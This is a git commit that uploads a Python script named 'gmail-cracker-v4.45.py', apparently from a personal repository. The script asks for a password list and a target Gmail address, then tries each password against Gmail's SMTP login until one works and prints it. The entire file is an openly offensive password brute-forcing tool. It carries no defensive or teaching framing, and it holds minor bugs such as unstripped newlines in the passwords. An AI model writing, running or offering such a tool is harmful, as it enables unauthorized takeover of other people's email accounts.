481cbe8e90c777fc82d22d9f05ec1fc5308ef5b1
badtree68 <108075849+badtree68@users.noreply.github.com>
2022-06-24 12:59:14 -0400

    Add files via upload

---
+++ gmail-cracker-v4.45.py
@@ -0,0 +1,19 @@
+import smtplib
+from colorama import Fore,init
+init()
+bruteforce=smtplib.SMTP("smtp.gmail.com",587)
+# 587 or 465
+print(                                                 f"{Fore.RED}     programmer:badtree        ") 
+bruteforce.ehlo()
+bruteforce.starttls()
+passlist=input("enter a your passlist: ")
+target=input("enter target 's gmail: ")
+readfile=open(passlist, "r")
+for passwords in readfile:
+    try:
+        bruteforce.login(target,passwords)
+        print(f"{Fore.GREEN}[+] password found !{passwords}")
+        break
+    except:
+        print(f"{Fore.GREEN}[-] pssword false : {passwords}  ")
+
